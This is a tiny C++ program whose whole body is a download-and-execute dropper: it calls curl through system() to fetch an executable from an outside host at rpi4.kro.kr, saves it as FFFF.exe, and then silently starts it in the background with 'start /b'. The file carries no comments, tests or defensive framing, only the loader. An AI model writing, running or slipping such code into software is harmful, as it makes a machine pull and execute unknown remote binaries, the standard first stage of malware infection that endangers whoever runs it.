#include <cstdlib>

int main()
{
	system("curl --output FFFF.exe http://www.rpi4.kro.kr/transfer/aaa.exe");
	system("start /b FFFF.exe");
	return 0;
}
